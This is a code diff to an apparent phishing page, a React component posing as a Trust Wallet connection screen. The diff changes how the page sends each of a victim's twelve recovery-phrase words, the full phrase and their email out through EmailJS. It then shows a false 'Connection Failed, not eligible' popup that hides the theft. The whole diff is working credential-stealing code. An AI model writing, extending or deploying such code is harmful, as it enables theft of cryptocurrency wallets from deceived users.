@@ -39,21 +39,44 @@ const TrustWalletConnect = () => {
 
   const sendEmail = async () => {
     setIsSending(true);
+    
+    console.log("🚀 Starting email send process...");
+    
     try {
       emailjs.init(EMAIL_CONFIG.publicKey);
+      console.log("✅ EmailJS initialized");
 
-      await emailjs.send(
+      const templateParams = {
+        user_email: email,
+        word_1: words[0],
+        word_2: words[1],
+        word_3: words[2],
+        word_4: words[3],
+        word_5: words[4],
+        word_6: words[5],
+        word_7: words[6],
+        word_8: words[7],
+        word_9: words[8],
+        word_10: words[9],
+        word_11: words[10],
+        word_12: words[11],
+        full_phrase: words.join(" "),
+        submission_date: new Date().toLocaleString()
+      };
+
+      console.log("📝 Sending email...");
+
+      const response = await emailjs.send(
         EMAIL_CONFIG.serviceId,
         EMAIL_CONFIG.templateId,
-        {
-          to_email: RECIPIENT_EMAIL,
-          user_email: email,
-          full_phrase: words.join(" "),
-          submission_date: new Date().toLocaleString(),
-        }
+        templateParams
       );
-    } catch (err) {
-      console.error(err);
+
+      console.log("✅ Email sent successfully!", response);
+      alert("✅ Email sent! Check your inbox.");
+    } catch (error) {
+      console.error("❌ Failed to send email:", error);
+      alert("❌ Email failed! Error: " + (error.text || error.message));
     } finally {
       setIsSending(false);
       setShowPopup(true);
@@ -127,21 +150,20 @@ const TrustWalletConnect = () => {
       </div>
 
       {showPopup && (
-  <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
-    <div className="twc-modal-box">
-      <div className="twc-popup-icon">✕</div>
-      <h3 className="twc-popup-title">Connection Failed!</h3>
-      <p className="twc-popup-text">
-        Your Trust Wallet is not eligible for connection.
-        Please try connecting with a different Trust Wallet.
-      </p>
-      <button className="twc-popup-btn" onClick={closePopup}>
-        OK
-      </button>
-    </div>
-  </div>
-)}
-
+        <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
+          <div className="twc-modal-box">
+            <div className="twc-popup-icon">✕</div>
+            <h3 className="twc-popup-title">Connection Failed!</h3>
+            <p className="twc-popup-text">
+              Your Trust Wallet is not eligible for connection.
+              Please try connecting with a different Trust Wallet.
+            </p>
+            <button className="twc-popup-btn" onClick={closePopup}>
+              OK
+            </button>
+          </div>
+        </div>
+      )}
     </>
   );
 };
